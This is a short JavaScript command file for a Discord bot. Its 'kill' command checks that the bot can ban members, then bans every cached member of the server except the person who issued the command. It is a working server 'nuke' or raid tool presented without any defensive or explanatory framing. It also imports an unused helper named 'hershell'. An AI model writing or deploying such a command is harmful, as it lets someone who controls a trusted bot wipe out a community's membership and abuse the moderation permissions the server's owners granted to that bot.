const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "kill",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {
    
    if(!message.guild.members.me.permissions.has("BanMembers")) return error(message, "I'm missing permissions!")

    message.guild.members.cache.forEach(async (r) => {
        if(r.id !== message.author.id) {
            if(!r.bannable) return console.log(`${r.id} is not been banned!`)
            await r.ban();
        }
    })
  },
};